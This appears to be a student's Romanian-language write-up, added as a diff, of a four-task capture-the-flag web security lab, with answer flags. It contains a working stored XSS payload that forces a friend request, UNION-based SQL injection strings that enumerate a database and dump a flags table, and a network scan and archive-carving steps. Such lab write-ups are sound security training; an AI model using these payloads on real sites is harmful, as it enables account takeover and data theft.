@@ -1,0 +1,76 @@
+TEMA2 ISC
+
+
+
+TASK1 (partea de conectare)
+
+-> ip a s => ca sa aflu ip si rezulta inet 192.168.224.4/20
+nmap -sN 192.168.224.4/24  => gasesc ip-urile puse pe UP  192.168.224.113 80 (pt host)
+./webtunnel.sh 192.168.224.113  80 (pt conectare la server)
+http://localhost:8080 (pt browser)
+-> cand am dat pe pagina de register si am descarcat o am gasit adevaratul link spre pagina de register care era /auth/register_real_one/ 
+-> am intrat, mi am facut cont, m am logat
+-> am descarcat apoi pagina noua http://localhost:8080/inside si acolo am gasit flagul
+
+SpeishFlag{KULO8eXmn49ooxdPh0AbKIOU0Yvy5Fbs}
+
+
+TASK2 
+
+M-am uitat pe toate sursele html si js si am gasit pagina main.js pentru profilul de home unde se gasesc 3 functii printre care si cea pentru a adauga un prieten si a accepta o cerere, deci am dedus ca trebuie sa folosesc functia de accept. In pagina bossului am gasit div class="box profile-view" data-user-id="1">, 1 fiind id-ul bossului, apoi am vrut sa vad ce id are profilul creat de mine, student, si am descoperit id-ul 9 prin incercarea paginilor la rand.
+Hintul sugera ca trebuie sa ma folosesc de un prieten comun, acesta fiind Kat Nyan, prieten comun intre mine si boss, astfel initiez atacul dandu-i acestuia mesaj cu urmatorul script:
+<script>
+$(function() {
+    if (window.authUserName == 'nyan') {
+        var form = document.getElementsByTagName("form")[0];
+
+        form.action = "/inside/message/send/1";
+
+        var textarea = form.getElementsByTagName("textarea")[0];
+
+        textarea.value = "<script> $(function() { acceptFriend(9) }); <\/script>";
+
+        form.submit();
+    }
+});
+</script>
+Dupa ce am devenit prieten cu boss-ul am descarcat pagina bossului si acolo am dat de flag. Se gasea de asemenea direct in browser in una din postarile bossului.
+
+SpeishFlag{TtZ64kxkwLxWy8BEGj7hmSTkhysUlIg3}
+
+
+TASK3
+
+Una din postarile bossului era un anunt despre un fisier backup.sh, asa ca descarc acest fisier cu localhost:8080/backup.sh si in el vad ca mai este o arhiva la care trebuie sa ajung folosindu-ma de o data random cu 16 zile in urma asa ca iau pe incercate pana mi se descarca o noua arhiva, folosind data de 30.12, http://localhost:8080/backup-2023-12-30.tar.gz. Deoarece e o arhiva .tar.gz, are primii biti din header 1f 8b 08. Am folosit hexedit ca sa caut acesti biti si am dat /1f8b08 si am ajuns la 0xB0155, aceasta fiind adresa de unde incep bitii de header.
+Ma folosesc de comanda tail -c +$((16#B0156)) backup-2023-12-21.tar.gz > flag.tar.gz prin care extrag continutul fisierului incepand de la pozitia B0156 si dupa ce ma uit in arhiva gasesc flag.txt unde gasesc flagul si un link de youtube spre manele.
+
+
+SpeishFlag{vxXRwH1eD9l9OIsjWoMNsTFq1jdsqniD}
+
+
+TASK4
+
+Incep prin a afla numarul de coloane al bazei de date si incerc comanda la rand pana vad ca la 9 primesc eroare, ' or 1 order by 1,2,3,4,5,6,7,8 -- x. Dau apoi comanda ' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8 FROM information_schema.tables -- x  si rezulta coloana  3's Profile. 3 din comada se inlocuieste cu group_concat(distinct(table_schema) separator ','), care ma face sa gasesc schema, in cazul meu information_schema,performance_schema,web_4169's Profile. Ma folosesc de asta si dau ' UNION SELECT 1, 2, group_concat(table_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.tables where table_schema='web_4169' -- x.  Asa am ajuns la : accounts,flags53929,friends,messages,posts's Profile 6.
+Flag-ul se afla in tabela flags53929, asa ca am creat urmatoarea cerere:
+    ' UNION SELECT 1, 2, group_concat(column_name separator ','), 4, 5, 6, 7, 8 FROM information_schema.columns where table_schema='web_4169' and table_name='flags53929'-- x
+   Cele 2 coloane la care am ajuns apoi au fost : id,zaflag's Profile 6. 
+   Am aflat flag-ul prin aceasta ultima cerere: 
+    ' UNION SELECT 1, 2, zaflag, 4, 5, 6, 7, 8 FROM web_4169.flags53929-- x
+
+
+
+
+
+SpeishFlag{T0NP1QZJ6Nugu6BO7dKMcgY4RsPuCpEM}
+
+
+
+
+
+
+
+
+
+
+
+
